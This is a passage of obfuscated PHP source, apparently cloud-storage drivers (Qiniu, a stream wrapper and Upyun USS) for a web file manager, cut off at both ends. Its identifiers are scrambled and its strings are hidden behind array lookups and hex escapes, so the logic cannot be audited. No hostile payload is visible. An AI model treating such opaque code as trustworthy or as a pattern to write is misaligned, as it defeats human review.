$æ©Ä¥– ? !1 : $this->getPathOuter($Èş×ŒˆÍ); } public function delFile($Ã÷ãåË§) { if (!$this->exist($Ã÷ãåË§)) { return !0; } $îƒ‹÷Êƒ = $this->bucketManager->delete($this->bucket, $Ã÷ãåË§); if (!$îƒ‹÷Êƒ) { return !0; } return $îƒ‹÷Êƒ->code() == 612 ? !0 : !1; } public function delFolder($×É—ƒ¥ı) { $¿’Á¦šœ =& $_SERVER[áäÒ½¯Ç]; if (!$this->exist($×É—ƒ¥ı)) { return !0; } $this->listItemCache = !1; $­ïÍ‘ş = $this->fileList($×É—ƒ¥ı); $this->listItemCache = !0; $”ƒ©Úî = trim($×É—ƒ¥ı, $¿’Á¦šœ[8]) . $¿’Á¦šœ[8]; if (!empty($×É—ƒ¥ı) && $×É—ƒ¥ı !== $¿’Á¦šœ[239] && !in_array($”ƒ©Úî, $­ïÍ‘ş[$¿’Á¦šœ[85]])) { $­ïÍ‘ş[$¿’Á¦šœ[85]][] = $”ƒ©Úî; } $°¶ºß£Ä = $this->delByBatch($­ïÍ‘ş[$¿’Á¦šœ[86]]); if (!$°¶ºß£Ä) { return !1; } $°¶ºß£Ä = $this->delByBatch($­ïÍ‘ş[$¿’Á¦šœ[85]]); if (!$°¶ºß£Ä) { return !1; } return $this->delFile($”ƒ©Úî); } private function delByBatch($ˆ»ëãó) { foreach (array_chunk($ˆ»ëãó, 1000) as $€ÎÈàÆÏ) { $¯º¾ú½ã = $this->bucketManager->buildBatchDelete($this->bucket, $€ÎÈàÆÏ); list($Ê”õáƒÚ, $èÀˆ‰Í) = $this->bucketManager->batch($¯º¾ú½ã); if ($èÀˆ‰Í) { return !1; } } return !0; } public function rename($İƒïšÎ™, $– æ×úé) { return $this->renameObject($İƒïšÎ™, $– æ×úé); } public function fileInfo($òˆı›Ù¸, $ä—ê¯± = false, $½Úóàò’ = array()) { $ĞÄßÕÚõ =& $_SERVER[áäÒ½¯Ç]; $£ù¸õ’Ò = array($ĞÄßÕÚõ[32] => $this->pathThis($òˆı›Ù¸), $ĞÄßÕÚõ[87] => $this->getPathOuter($ĞÄßÕÚõ[8] . $òˆı›Ù¸), $ĞÄßÕÚõ[33] => $ĞÄßÕÚõ[241], $ĞÄßÕÚõ[79] => isset($½Úóàò’[$ĞÄßÕÚõ[1685]]) ? $½Úóàò’[$ĞÄßÕÚõ[1685]] : 0, $ĞÄßÕÚõ[167] => $this->ext($òˆı›Ù¸)); if ($ä—ê¯±) { return $£ù¸õ’Ò; } $£ù¸õ’Ò[$ĞÄßÕÚõ[242]] = $£ù¸õ’Ò[$ĞÄßÕÚõ[88]] = 0; $£ù¸õ’Ò[$ĞÄßÕÚõ[243]] = $£ù¸õ’Ò[$ĞÄßÕÚõ[244]] = !0; if (empty($½Úóàò’)) { $½Úóàò’ = $this->objectMeta($òˆı›Ù¸); if (!$½Úóàò’) { return $£ù¸õ’Ò; } } if (isset($½Úóàò’[$ĞÄßÕÚõ[245]]) && $½Úóàò’[$ĞÄßÕÚõ[245]]) { $£ù¸õ’Ò[$ĞÄßÕÚõ[246]] = $½Úóàò’[$ĞÄßÕÚõ[245]]; } if (isset($½Úóàò’[$ĞÄßÕÚõ[256]]) && $½Úóàò’[$ĞÄßÕÚõ[256]]) { $£ù¸õ’Ò[$ĞÄßÕÚõ[246]] = $½Úóàò’[$ĞÄßÕÚõ[256]]; } if (isset($½Úóàò’[$ĞÄßÕÚõ[1686]])) { $£ù¸õ’Ò[$ĞÄßÕÚõ[88]] = substr($½Úóàò’[$ĞÄßÕÚõ[1686]] . $ĞÄßÕÚõ[12], 0, 10); } if (isset($½Úóàò’[$ĞÄßÕÚõ[1685]])) { $£ù¸õ’Ò[$ĞÄßÕÚõ[79]] = $½Úóàò’[$ĞÄßÕÚõ[1685]]; } return $£ù¸õ’Ò; } public function folderInfo($«²ñÆõÒ, $íµ‘¼‰î = false) { $ô÷µÒ¬ =& $_SERVER[áäÒ½¯Ç]; $Š½¦©ŠÃ = array($ô÷µÒ¬[32] => $this->pathThis($«²ñÆõÒ), $ô÷µÒ¬[87] => $this->getPathOuter($ô÷µÒ¬[8] . $«²ñÆõÒ), $ô÷µÒ¬[33] => $ô÷µÒ¬[78]); if ($íµ‘¼‰î) { return $Š½¦©ŠÃ; } $Š½¦©ŠÃ[$ô÷µÒ¬[242]] = $Š½¦©ŠÃ[$ô÷µÒ¬[88]] = 0; $Š½¦©ŠÃ[$ô÷µÒ¬[243]] = $Š½¦©ŠÃ[$ô÷µÒ¬[244]] = !0; $«²ñÆõÒ = rtrim($«²ñÆõÒ, $ô÷µÒ¬[8]) . $ô÷µÒ¬[8]; $´õÏ¤·• = $this->objectMeta($«²ñÆõÒ); if (isset($´õÏ¤·•[$ô÷µÒ¬[1686]])) { $Š½¦©ŠÃ[$ô÷µÒ¬[88]] = substr($´õÏ¤·•[$ô÷µÒ¬[1686]] . $ô÷µÒ¬[12], 0, 10); } return $Š½¦©ŠÃ; } public function listPath($øÊ­±×, $“§Œœ‘á = false) { $½È¿£ôÇ =& $_SERVER[áäÒ½¯Ç]; $ãå½ƒ©º = $this->fileList($øÊ­±×, $½È¿£ôÇ[8], !0); foreach ($ãå½ƒ©º[$½È¿£ôÇ[85]] as $§½¶õÖ => $°Ëã ©…) { $ãå½ƒ©º[$½È¿£ôÇ[85]][$§½¶õÖ] = $this->folderInfo($°Ëã ©…, $“§Œœ‘á); } foreach ($ãå½ƒ©º[$½È¿£ôÇ[86]] as $§½¶õÖ => $°Ëã ©…) { $ãå½ƒ©º[$½È¿£ôÇ[86]][$§½¶õÖ] = $this->fileInfo($°Ëã ©…[$½È¿£ôÇ[32]], $“§Œœ‘á, $°Ëã ©…); } return $ãå½ƒ©º; } public function has($Éó•Üıâ, $²ø¿×” = false, $õ©˜ÀØ• = true) { $§Ÿïö—õ =& $_SERVER[áäÒ½¯Ç]; $Éó•Üıâ = trim($Éó•Üıâ, $§Ÿïö—õ[8]); $®Â’ÜƒÕ = empty($Éó•Üıâ) && $Éó•Üıâ !== $§Ÿïö—õ[239] ? $§Ÿïö—õ[12] : $Éó•Üıâ . $§Ÿïö—õ[8]; $³³•Ñ÷÷ = $§Ÿïö—õ[12]; $¶œã„Ãù = 500; $óå½Şºı = $§Ÿïö—õ[8]; $ù¨Ø†ß‰ = $²èùó©Ÿ = 0; while (!0) { check_abort(); list($˜¤æ­ğğ, $ÛÂï•ÆÕ) = $this->bucketManager->listFiles($this->bucket, $®Â’ÜƒÕ, $³³•Ñ÷÷, $¶œã„Ãù, $óå½Şºı); if ($ÛÂï•ÆÕ) { break; } $³³•Ñ÷÷ = array_key_exists($§Ÿïö—õ[1633], $˜¤æ­ğğ) ? $³³•Ñ÷÷ = $˜¤æ­ğğ[$§Ÿïö—õ[1687]] : $§Ÿïö—õ[12]; if ($²ø¿×”) { if (!empty($˜¤æ­ğğ[$§Ÿïö—õ[1688]])) { $ù¨Ø†ß‰ += count($˜¤æ­ğğ[$§Ÿïö—õ[1688]]); } if (!empty($˜¤æ­ğğ[$§Ÿïö—õ[1689]])) { $²èùó©Ÿ += count($˜¤æ­ğğ[$§Ÿïö—õ[1689]]); } if ($³³•Ñ÷÷ === $§Ÿïö—õ[12]) { break; } continue; } if ($õ©˜ÀØ•) { if (!empty($˜¤æ­ğğ[$§Ÿïö—õ[1688]])) { return !0; } } else { if (!empty($˜¤æ­ğğ[$§Ÿïö—õ[1689]])) { return !0; } } if ($³³•Ñ÷÷ === $§Ÿïö—õ[12]) { break; } } if ($²ø¿×”) { return array($§Ÿïö—õ[250] => $ù¨Ø†ß‰, $§Ÿïö—õ[251] => $²èùó©Ÿ); } return !1; } public function listAll($ôËûˆÖ) { $ÑÁìËåô =& $_SERVER[áäÒ½¯Ç]; $ìÅ‘Ã¸â = $this->fileList($ôËûˆÖ, $ÑÁìËåô[12], !0); $³•¨„õ¥ = array_to_keyvalue($ìÅ‘Ã¸â[$ÑÁìËåô[86]], $ÑÁìËåô[32]); foreach ($ìÅ‘Ã¸â[$ÑÁìËåô[85]] as $ƒƒÛ£«×) { if (is_string($ƒƒÛ£«×)) { $³•¨„õ¥[$ƒƒÛ£«×] = array($ÑÁìËåô[79] => 0); } } return $this->listAllFiles($ôËûˆÖ, $³•¨„õ¥); } private function fileList($Ù‹ä…æ, $½™ÉÚ = '', $âêüË§¹ = 0) { $«®ñØ¯® =& $_SERVER[áäÒ½¯Ç]; $Ù‹ä…æ = trim($Ù‹ä…æ, $«®ñØ¯®[8]); $äš±È´œ = empty($Ù‹ä…æ) && $Ù‹ä…æ !== $«®ñØ¯®[239] ? $«®ñØ¯®[12] : $Ù‹ä…æ . $«®ñØ¯®[8]; $­ÎØÒÌ = $«®ñØ¯®[12]; $¾ºƒ„Ã¦ = 1000; $øãè‡Æ‘ = $¤õÉÁŠ½ = array(); while (!0) { check_abort(); list($¢ÏïßÅÕ, $æé²é€ƒ) = $this->bucketManager->listFiles($this->bucket, $äš±È´œ, $­ÎØÒÌ, $¾ºƒ„Ã¦, $½™ÉÚ); if ($æé²é€ƒ) { break; } $­ÎØÒÌ = array_key_exists($«®ñØ¯®[1633], $¢ÏïßÅÕ) ? $­ÎØÒÌ = $¢ÏïßÅÕ[$«®ñØ¯®[1687]] : $«®ñØ¯®[12]; $Şª„Å¼¯ = isset($¢ÏïßÅÕ[$«®ñØ¯®[1688]]) ? $¢ÏïßÅÕ[$«®ñØ¯®[1688]] : array(); $„óà¡Ï‹ = isset($¢ÏïßÅÕ[$«®ñØ¯®[1689]]) ? $¢ÏïßÅÕ[$«®ñØ¯®[1689]] : array(); foreach ($Şª„Å¼¯ as $íÒ×¡ç¾) { if ($íÒ×¡ç¾[$«®ñØ¯®[95]] == $äš±È´œ) { continue; } $œÒ„‡ñº = $íÒ×¡ç¾[$«®ñØ¯®[95]]; $ªñ½µø• = $íÒ×¡ç¾[$«®ñØ¯®[1685]]; $íÒ×¡ç¾[$«®ñØ¯®[32]] = $œÒ„‡ñº; $íÒ×¡ç¾[$«®ñØ¯®[79]] = $ªñ½µø•; $ñ®é«× = $ªñ½µø• == 0 && substr($œÒ„‡ñº, strlen($œÒ„‡ñº) - 1, 1) == $«®ñØ¯®[8] ? !0 : !1; $this->cacheMethodInfoSet($œÒ„‡ñº, $ñ®é«×, $íÒ×¡ç¾); if ($ñ®é«×) { $øãè‡Æ‘[] = $œÒ„‡ñº; continue; } $¤õÉÁŠ½[] = $âêüË§¹ ? $íÒ×¡ç¾ : $œÒ„‡ñº; } foreach ($„óà¡Ï‹ as $œÒ„‡ñº) { if ($œÒ„‡ñº == $äš±È´œ) { continue; } $øãè‡Æ‘[] = $œÒ„‡ñº; $this->cacheMethodInfoSet($œÒ„‡ñº, !0); } if ($­ÎØÒÌ === $«®ñØ¯®[12]) { break; } } $this->cacheMethodInfoSet($Ù‹ä…æ, !0); return array($«®ñØ¯®[85] => $øãè‡Æ‘, $«®ñØ¯®[86] => $¤õÉÁŠ½); } public function canRead($Æó…¶Üö) { return $this->exist($Æó…¶Üö) ? !0 : !1; } public function canWrite($İœÕ½—ƒ) { return $this->exist($İœÕ½—ƒ) ? !0 : !1; } public function getContent($‚¥ÄØÄŸ) { return $this->fileSubstr($‚¥ÄØÄŸ, 0, -1); } public function setContent($™Í¯®ëœ, $½Æ‹ŸÔ¤ = '') { $Ü øÚº = $this->tempFile($this->pathThis($™Í¯®ëœ)); file_put_contents($Ü øÚº, $½Æ‹ŸÔ¤); if ($this->upload($™Í¯®ëœ, $Ü øÚº)) { $this->tempFileRemve($Ü øÚº); return !0; } return !1; } public function refreshUrls($“×ÖĞÅŸ) { $¤¼ÚÆÕĞ =& $_SERVER[áäÒ½¯Ç]; $Ç°²ªÅ­ = array(); if (is_array($“×ÖĞÅŸ)) { foreach ($“×ÖĞÅŸ as $ÉÖ±à‰®) { $Ç°²ªÅ­[] = $this->link($ÉÖ±à‰®); } } else { $Ç°²ªÅ­[] = $this->link($“×ÖĞÅŸ); } $‘©ìªÚÄ = new Qiniu\Cdn\CdnManager($this->auth); list($ÖÏãˆüã, $à›’ò) = $‘©ìªÚÄ->refreshUrls($Ç°²ªÅ­); if ($à›’ò) { return !1; } return $ÖÏãˆüã[$¤¼ÚÆÕĞ[1317]] == $¤¼ÚÆÕĞ[862] ? !0 : !1; } public function fileSubstr($¨Å¥¬–, $â«ÂÎàİ, $µÈıÏí) { $éá‰Œâ­ =& $_SERVER[áäÒ½¯Ç]; if (!($ÀÛöñÛ = $this->link($¨Å¥¬–))) { return !1; } $Œ´Æ•—‘ = !1; if ($µÈıÏí > 0) { $úÀä›Ğ = $â«ÂÎàİ + $µÈıÏí - 1; $Œ´Æ•—‘ = array($éá‰Œâ­[1554] . $â«ÂÎàİ . $éá‰Œâ­[482] . $úÀä›Ğ); } $İ–‡ˆå• = url_request($ÀÛöñÛ, $éá‰Œâ­[1555], !1, $Œ´Æ•—‘); return $İ–‡ˆå•[$éá‰Œâ­[852]] ? $İ–‡ˆå•[$éá‰Œâ­[1339]] : !1; } public function upload($² ¯³ƒ, $÷ÈàÈ, $†¨‡Ù³Ï = false, $êİÈèø› = REPEAT_REPLACE) { if (!$÷ÈàÈ || !@file_exists($÷ÈàÈ)) { return !1; } $ñíì‰Àç = new Qiniu\Storage\UploadManager(); $°–µçÆ = $this->auth->uploadToken($this->bucket, $² ¯³ƒ); $Çö…Ë”¹ = get_file_mime(get_path_ext($÷ÈàÈ)); list($êö¸ïĞ¯, $¢Ï­áá«) = $ñíì‰Àç->putFile($°–µçÆ, $² ¯³ƒ, $÷ÈàÈ, null, $Çö…Ë”¹); return $¢Ï­áá« ? !1 : $this->getPathOuter($² ¯³ƒ); } public function uploadFormData($¢Ç¥šå¥, $–öÚì‰à = 3600) { return $this->uploadToken($¢Ç¥šå¥, $–öÚì‰à); } public function uploadMultiData($€Ç¹¥”î, $ÈšÈĞÎœ = 3600) { return $this->uploadToken($€Ç¹¥”î, $ÈšÈĞÎœ); } private function uploadToken($Ç¦ÉŒ¾’, $ø«Œò« = 3600) { $Ÿ¾‹œğÜ =& $_SERVER[áäÒ½¯Ç]; $»á â¼ = $ø«Œò«; $Ç›î÷ãú = array($Ÿ¾‹œğÜ[1690] => $Ÿ¾‹œğÜ[1691]); $ªóŸƒÎ = $Ç¦ÉŒ¾’; $¾º·ı¡£ = $this->auth->uploadToken($this->bucket, $ªóŸƒÎ, $»á â¼, $Ç›î÷ãú, !0); $‡şâÈ¾³ = empty($this->region) || $this->region == $Ÿ¾‹œğÜ[1692] ? $Ÿ¾‹œğÜ[12] : $Ÿ¾‹œğÜ[482] . $this->region; $ÁÃø…îë = http_type() . "\72\x2f\57\x75\160\154\x6f\141\x64{$‡şâÈ¾³}\56\161\x69\x6e\x69\165\x70\56\x63\157\155\57"; return array($Ÿ¾‹œğÜ[1693] => $¾º·ı¡£, $Ÿ¾‹œğÜ[1557] => $ÁÃø…îë); } public function download($äî˜¬ÒÅ, $Æƒ›òÄÙ) { $¯œ‘ÕË = IO::getPathInner(IO::mkfile($Æƒ›òÄÙ)); if (!($Š‹ªÙ‘ã = $this->link($äî˜¬ÒÅ))) { return !1; } $•Ûå²àÚ = 0; $óã‡Û¯ = 1024 * 200; $êŞ‡‰²Ê = fopen($¯œ‘ÕË, $_SERVER[áäÒ½¯Ç][1694]); while (!0) { $¡ƒŒˆ¹– = $this->fileSubstr($äî˜¬ÒÅ, $•Ûå²àÚ, $óã‡Û¯); if ($¡ƒŒˆ¹– === !1) { return !1; } fwrite($êŞ‡‰²Ê, $¡ƒŒˆ¹–); $•Ûå²àÚ += $óã‡Û¯; if (strlen($¡ƒŒˆ¹–) < $óã‡Û¯) { break; } } fclose($êŞ‡‰²Ê); return $Æƒ›òÄÙ; } public function link($à•Óï•Ò, $Ä¢ÑşÂÖ = '') { if (!$this->isFile($à•Óï•Ò)) { return !1; } $°øúÖç¾ = $this->getHost() . $_SERVER[áäÒ½¯Ç][8] . $this->pathEncode($à•Óï•Ò) . $Ä¢ÑşÂÖ; return $this->auth->privateDownloadUrl($°øúÖç¾, 3600 * 12); } public function fileOut($ÊÔçª, $”ªæôâô = false, $¼ıĞ¹Ú = false, $Ä­×¶Ñ = '') { $¶ìœÅµ =& $_SERVER[áäÒ½¯Ç]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÊÔçª, $”ªæôâô, $¼ıĞ¹Ú, $Ä­×¶Ñ); } if (!$¼ıĞ¹Ú) { $¼ıĞ¹Ú = $this->pathThis($ÊÔçª); } $èƒµ°ƒœ = $”ªæôâô ? $¶ìœÅµ[1695] . rawurlencode($¼ıĞ¹Ú) : $¶ìœÅµ[12]; $Àá§œ²› = $this->link($ÊÔçª, $èƒµ°ƒœ); $this->fileOutLink($Àá§œ²›); } public function fileOutServer($†ÈÌÊ’º, $ÌÕÒª”œ = false, $ÇÅçÅÅ = false, $ıµÂØË = '') { parent::fileOut($†ÈÌÊ’º, $ÌÕÒª”œ, $ÇÅçÅÅ, $ıµÂØË); } public function fileOutImage($¡õ»©à¬, $«¶‘©‘ = 250) { if ($this->size($¡õ»©à¬) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¡õ»©à¬, $«¶‘©‘); } $çÇ¡ŸËÍ = $this->link($¡õ»©à¬, $_SERVER[áäÒ½¯Ç][1696] . $«¶‘©‘); $this->fileOutLink($çÇ¡ŸËÍ); } public function fileOutImageServer($éÚáÕÉ©, $¬‘§üÏë = 250) { parent::fileOutImage($éÚáÕÉ©, $¬‘§üÏë); } public function hashMd5($ŸÜäåìç) { $ôÛ¡¢”Ä =& $_SERVER[áäÒ½¯Ç]; $ˆ¯ÌŠÁ‘ = $this->objectMeta($ŸÜäåìç); return isset($ˆ¯ÌŠÁ‘[$ôÛ¡¢”Ä[256]]) ? $ˆ¯ÌŠÁ‘[$ôÛ¡¢”Ä[256]] : !1; $›Åç = $this->link($ŸÜäåìç, $ôÛ¡¢”Ä[1697]); } public function size($¯„İùÖ) { $Ñèò¤†­ = $this->objectMeta($¯„İùÖ); return $Ñèò¤†­ ? $Ñèò¤†­[$_SERVER[áäÒ½¯Ç][79]] : 0; } public function info($¯™½üÌÛ) { if ($this->isFolder($¯™½üÌÛ)) { return $this->folderInfo($¯™½üÌÛ); } else { if ($this->isFile($¯™½üÌÛ)) { return $this->fileInfo($¯™½üÌÛ); } } return !1; } public function exist($ÂãÓ«¼) { return $this->isFile($ÂãÓ«¼) || $this->isFolder($ÂãÓ«¼); } public function isFile($‰åÛŸœÀ) { return !$this->isFolder($‰åÛŸœÀ) && $this->objectMeta($‰åÛŸœÀ); } public function isFolder($ªÁıÀâ) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][178], $ªÁıÀâ); } protected function objectMeta($¾…ª‡Ş½) { return $this->cacheMethod($_SERVER[áäÒ½¯Ç][180], $¾…ª‡Ş½); } protected function _objectMeta($æŠ¯½ë¹) { $‚ğ¼€Â± =& $_SERVER[áäÒ½¯Ç]; list($á¦™À»”, $Ÿ¶šç¦ì) = $this->bucketManager->stat($this->bucket, $æŠ¯½ë¹); if ($á¦™À»”) { $á¦™À»”[$‚ğ¼€Â±[79]] = intval($á¦™À»”[$‚ğ¼€Â±[1685]]); } return $á¦™À»”; } protected function _isFolder($âÒ›ĞË) { $ÇşŞø÷¢ =& $_SERVER[áäÒ½¯Ç]; if ($âÒ›ĞË == $ÇşŞø÷¢[12] || $âÒ›ĞË == $ÇşŞø÷¢[8]) { return !0; } list($Å·Äè”ş, $°ŒËÔ¥) = $this->bucketManager->listFiles($this->bucket, trim($âÒ›ĞË, $ÇşŞø÷¢[8]) . $ÇşŞø÷¢[8], $ÇşŞø÷¢[12], 1, $ÇşŞø÷¢[8]); return !empty($Å·Äè”ş[$ÇşŞø÷¢[1688]]) || !empty($Å·Äè”ş[$ÇşŞø÷¢[1689]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($±æß§Èß, $—ÔúÆØÉ = 0) { parent::__construct(); $this->source = $±æß§Èß; $this->sourceSize = $—ÔúÆØÉ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($—Ëòğš« = false) { return $this->sourceSize; } public function getContent($ÕûÃÌ­§ = false) { return $this->fileSubstr($ÕûÃÌ­§, 0, $this->sourceSize); } public function fileSubstr($³î×ÂŞ = false, $ñ£é¹ı = 0, $úİ®ïİÆ = 0) { if (!$úİ®ïİÆ) { $úİ®ïİÆ = $this->sourceSize; } $­Œ»š¢ü = $this->sourceSize - $ñ£é¹ı; if ($úİ®ïİÆ >= $­Œ»š¢ü) { $úİ®ïİÆ = $­Œ»š¢ü; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ñ£é¹ı, $úİ®ïİÆ); } if ($this->sourceType == self::TYPE_FILE) { if ($úİ®ïİÆ <= 0) { return $_SERVER[áäÒ½¯Ç][12]; } $Ó¸¿·¿Ó = ftell($this->source); fseek_64($this->source, $Ó¸¿·¿Ó + $ñ£é¹ı); $Û¤‡¿¨ = @fread($this->source, $úİ®ïİÆ); fseek_64($this->source, $Ó¸¿·¿Ó); return $Û¤‡¿¨; } } public function hashMd5($”‰¨–¤ = false) { return md5($this->getContent()); } public static function hash($©°„œÒ, $¢ÏªÂã„ = 0) { $ÒÌ¡Õ‚ß = new PathDriverStream($©°„œÒ, $¢ÏªÂã„); return $ÒÌ¡Õ‚ß->hashSimple($©°„œÒ); } public static function md5($¥¶ÀåÍ¦, $óˆæùš = 0) { $³à³È€‚ = new PathDriverStream($¥¶ÀåÍ¦, $óˆæùš); return $³à³È€‚->hashMd5($¥¶ÀåÍ¦); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\72\x2f\57\166\x30\56\x61\x70\x69\56\x75\x70\x79\165\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¡‹şˆ•) { parent::__construct(); $this->_init($¡‹şˆ•); } public function _init($õşğîõå) { $¬²éˆÂ£ =& $_SERVER[áäÒ½¯Ç]; foreach ($õşğîõå as $Ü²Ğ³ºÎ => $Ôôû˜•) { if (isset($this->{$Ü²Ğ³ºÎ})) { $this->{$Ü²Ğ³ºÎ} = $Ôôû˜•; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¬²éˆÂ£[1698] . LNG($¬²éˆÂ£[1621])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($œ¨àîŠŸ, $æ—£ãˆµ = "\x47\x45\124") { $œ‹Œ‹™Õ =& $_SERVER[áäÒ½¯Ç]; $‚Ëíû€‚ = gmdate($œ‹Œ‹™Õ[1650]); $æ¸¾Œ¼ê = base64_encode(hash_hmac($œ‹Œ‹™Õ[1699], "{$æ—£ãˆµ}\46{$œ¨àîŠŸ}\x26{$‚Ëíû€‚}", md5("{$this->userpass}"), !0)); $Öîå–¾ = array("\101\165\x74\150\157\162\151\172\x61\164\x69\x6f\156\x3a\x55\120\131\x55\116\x20{$this->username}\x3a{$æ¸¾Œ¼ê}", "\104\141\x74\x65\72{$‚Ëíû€‚}"); return $Öîå–¾; } public function ussRequest($ÈÂö›ª±, $‚èºµë = "\107\x45\x54", $£˜™ÜÁ = false, $¨à€ü›™ = false, $¤’Ø±ÄÃ = false) { $Š©Ü¥÷• =& $_SERVER[áäÒ½¯Ç]; $ÈÂö›ª± = trim($ÈÂö›ª±, $Š©Ü¥÷•[8]); $ÆœÙ”± = "\x2f{$this->bucket}\57" . rawurlencode($ÈÂö›ª±); $™ğ†×ìÅ = $this->ussHeaders($ÆœÙ”±, $‚èºµë); if ($¨à€ü›™) { $™ğ†×ìÅ = array_merge($™ğ†×ìÅ, $¨à€ü›™); } $¼„–åÁë = url_request($this->endpoint . $ÆœÙ”±, $‚èºµë, $£˜™ÜÁ, $™ğ†×ìÅ, $¤’Ø±ÄÃ); if (!$¼„–åÁë) { $úòò¿öÜ = LNG($Š©Ü¥÷•[1700]); $this->writeLog($úòò¿öÜ); return array($Š©Ü¥÷•[1349] => !1, $Š©Ü¥÷•[1339] => $úòò¿öÜ); } if (strtolower($‚èºµë) == $Š©Ü¥÷•[238] || in_array($¼„–åÁë[$Š©Ü¥÷•[1349]], array($Š©Ü¥÷•[272], $Š©Ü¥÷•[1701]))) { $£˜™ÜÁ = $¼„–åÁë[$Š©Ü¥÷•[1702]]; if (!$¼„–åÁë[$Š©Ü¥÷•[852]]) { $£˜™ÜÁ = isset($£˜™ÜÁ[0]) ? $£˜™ÜÁ[0] : $Š©Ü¥÷•[12]; } } else { $£˜™ÜÁ = json_decode($¼„–åÁë[$Š©Ü¥÷•[1339]], !0); if (!$£˜™ÜÁ) { $£˜™ÜÁ = $¼„–åÁë[$Š©Ü¥÷•[1339]]; } else { if (!$¼„–åÁë[$Š©Ü¥÷•[852]] && isset($£˜™ÜÁ[$Š©Ü¥÷•[1703]])) { $£˜™ÜÁ = $£˜™ÜÁ[$Š©Ü¥÷•[1703]]; } } } if (!$¼„–åÁë[$Š©Ü¥÷•[852]]) { $this->writeLog($this->__errorMessage($£˜™ÜÁ)); } return array($Š©Ü¥÷•[1349] => $¼„–åÁë[$Š©Ü¥÷•[852]], $Š©Ü¥÷•[1339] => $£˜™ÜÁ); } private function __errorMessage($ü’ï¬½ù) { $İ” ƒ»‘ =& $_SERVER[áäÒ½¯Ç]; if (!$ü’ï¬½ù) { return $İ” ƒ»‘[12]; } static $Ç€ğÓØö = null; if (!$Ç€ğÓØö) { $Ç€ğÓØö = I18n::getType(); } if ($Ç€ğÓØö != $İ” ƒ»‘[1658]) { return $ü’ï¬½ù; } $äìËáŸ’ = array($İ” ƒ»‘[1704] => $İ” ƒ»‘[1705], $İ” ƒ»‘[1706] => $İ” ƒ»‘[1707], $İ” ƒ»‘[1708] => $İ” ƒ»‘[1707], $İ” ƒ»‘[1709] => $İ” ƒ»‘[1710], $İ” ƒ»‘[1711] => $İ” ƒ»‘[1712], $İ” ƒ»‘[1713] => $İ” ƒ»‘[1714], $İ” ƒ»‘[1715] => $İ” ƒ»‘[1716]); return isset($äìËáŸ’[$ü’ï¬½ù]) ? $äìËáŸ’[$ü’ï¬½ù] : $ü’ï¬½ù; } public function mkfile($Ê¸Š‡Ê³, $âòÊ¤ô = '', $ÓÔºûÖ = REPEAT_RENAME) { if ($this->setContent($Ê¸Š‡Ê³, $âòÊ¤ô)) { return $this->getPathOuter($Ê¸Š‡Ê³); } return !1; } public function mkdir($ÂÖÍ¾ï›, $Á¥¬ä  = REPEAT_SKIP) { $İÓ÷ßÏ‰ =& $_SERVER[áäÒ½¯Ç]; $£½ÚÊÎ¯ = trim($ÂÖÍ¾ï›, $İÓ÷ßÏ‰[8]); if ($this->_isFolder($£½ÚÊÎ¯)) { return $this->getPathOuter($£½ÚÊÎ¯); } $“ŒÌÔÎ– = array($İÓ÷ßÏ‰[1717]); $İÊ–Ïó¯ = $this->ussRequest($£½ÚÊÎ¯, $İÓ÷ßÏ‰[298], !1, $“ŒÌÔÎ–); return $İÊ–Ïó¯[$İÓ÷ßÏ‰[1349]] ? $this->getPathOuter($£½ÚÊÎ¯) : !1; } public function copyFile($‰çÅ²´, $øçµù´Á) { $¼ô±Çé =& $_SERVER[áäÒ½¯Ç]; $²ì¶¡ş = array($¼ô±Çé[1718] . "\57{$this->bucket}\x2f{$‰çÅ²´}", $¼ô±Çé[1719]); $£À€×” = $this->ussRequest($øçµù´Á, $¼ô±Çé[264], !1, $²ì¶¡ş); return $£À€×”[$¼ô±Çé[1349]] ? !0 : $this->getPathOuter($øçµù´Á); } public function moveFile($‰şı€üŒ, $š¥“ì„Û) { $ÒğãŸ‘Û =& $_SERVER[áäÒ½¯Ç]; $Øò³»Á = array($ÒğãŸ‘Û[1720] . "\x2f{$this->bucket}\57{$‰şı€üŒ}", $ÒğãŸ‘Û[1719]); $ÅäœóÎ¿ = $this->ussRequest($š¥“ì„Û, $ÒğãŸ‘Û[264], !1, $Øò³»Á); return $ÅäœóÎ¿[$ÒğãŸ‘Û[1349]] ? !0 : $this->getPathOuter($š¥“ì„Û); } public function delFile($éàİß‡ƒ) { $ˆô®ˆâ£ =& $_SERVER[áäÒ½¯Ç]; $¼Ó„ûÅ = $this->ussRequest($éàİß‡ƒ, $ˆô®ˆâ£[1721]); return $¼Ó„ûÅ[$ˆô®ˆâ£[1349]] ? !0 : !1; } public function delFolder($¦ó‘æ‹Û) { $Íö©ÚÃ† =& $_SERVER[áäÒ½¯Ç]; if (!$this->exist($¦ó‘æ‹Û)) { return !0; } $this->listItemCache = !1; $í¥ØÈúˆ = $±ú ù = array(); $this->fileList($¦ó‘æ‹Û, $í¥ØÈúˆ, $±ú ù, !0); $this->listItemCache = !0; foreach ($±ú ù as $—Î¶À†í) { $õ¨…ø¥æ = $this->ussRequest($—Î¶À†í[$Íö©ÚÃ†[32]], $Íö©ÚÃ†[1721]); if (!$õ¨…ø¥æ[$Íö©ÚÃ†[1349]]) { return !1; } } usort($í¥ØÈúˆ, function ($¡ãÛÏôï, $†Ë­ë°Ì) { $ŸÓ¶ãÉ® =& $_SERVER[áäÒ½¯Ç]; return substr_count($†Ë­ë°Ì, $ŸÓ¶ãÉ®[8]) - substr_count($¡ãÛÏôï, $ŸÓ¶ãÉ®[8]); }); foreach ($í¥ØÈúˆ as $‚·¢š×¥) { $õ¨…ø¥æ = $this->ussRequest($‚·¢š×¥, $Íö©ÚÃ†[1721]); if 